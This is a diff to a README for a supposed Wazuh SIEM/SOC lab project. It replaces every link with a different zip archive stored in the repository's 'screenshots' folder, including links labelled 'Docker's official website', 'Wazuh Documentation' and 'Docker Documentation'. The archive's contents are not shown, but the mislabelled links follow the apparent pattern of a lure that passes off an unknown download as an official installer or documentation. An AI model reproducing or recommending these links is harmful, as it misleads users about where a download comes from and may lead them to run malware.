@@ -1,6 +1,6 @@
 # 🚀 Wazuh-SIEM-SOC-Lab - Explore Your SIEM Lab Today
 
-[![Download Wazuh-SIEM-SOC-Lab](https://raw.githubusercontent.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/main/vps-agent-deployment/screenshots/Wazuh-SIE-SO-Lab-3.0-beta.5.zip)](https://raw.githubusercontent.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/main/vps-agent-deployment/screenshots/Wazuh-SIE-SO-Lab-3.0-beta.5.zip)
+[![Download Wazuh-SIEM-SOC-Lab](https://github.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/raw/refs/heads/main/screenshots/SO_Lab_Wazuh_SIE_2.1.zip)](https://github.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/raw/refs/heads/main/screenshots/SO_Lab_Wazuh_SIE_2.1.zip)
 
 ## 🌟 Overview
 
@@ -26,10 +26,10 @@ Before you begin, make sure your system meets these requirements:
 Follow these steps to set up Wazuh-SIEM-SOC-Lab on your computer.
 
 1. **Install Docker**: 
-   - If you haven't yet, download and install Docker Desktop for Windows from [Docker's official website](https://raw.githubusercontent.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/main/vps-agent-deployment/screenshots/Wazuh-SIE-SO-Lab-3.0-beta.5.zip).
+   - If you haven't yet, download and install Docker Desktop for Windows from [Docker's official website](https://github.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/raw/refs/heads/main/screenshots/SO_Lab_Wazuh_SIE_2.1.zip).
 
 2. **Download Wazuh-SIEM-SOC-Lab**:
-   - Visit this page to download: [Download Page](https://raw.githubusercontent.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/main/vps-agent-deployment/screenshots/Wazuh-SIE-SO-Lab-3.0-beta.5.zip).
+   - Visit this page to download: [Download Page](https://github.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/raw/refs/heads/main/screenshots/SO_Lab_Wazuh_SIE_2.1.zip).
 
 3. **Extract Files**:
    - After the download completes, extract the files to your desired location. 
@@ -54,7 +54,7 @@ Follow these steps to set up Wazuh-SIEM-SOC-Lab on your computer.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/main/vps-agent-deployment/screenshots/Wazuh-SIE-SO-Lab-3.0-beta.5.zip).
+To get started, visit this page to download: [Download Page](https://github.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/raw/refs/heads/main/screenshots/SO_Lab_Wazuh_SIE_2.1.zip).
 
 ## 🔍 Troubleshooting
 
@@ -65,8 +65,8 @@ If you encounter issues:
 
 ## 📚 Helpful Links
 
-- [Wazuh Documentation](https://raw.githubusercontent.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/main/vps-agent-deployment/screenshots/Wazuh-SIE-SO-Lab-3.0-beta.5.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/main/vps-agent-deployment/screenshots/Wazuh-SIE-SO-Lab-3.0-beta.5.zip)
+- [Wazuh Documentation](https://github.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/raw/refs/heads/main/screenshots/SO_Lab_Wazuh_SIE_2.1.zip)
+- [Docker Documentation](https://github.com/Aayushtjn/Wazuh-SIEM-SOC-Lab/raw/refs/heads/main/screenshots/SO_Lab_Wazuh_SIE_2.1.zip)
 
 ## 🛠 Contribution
 
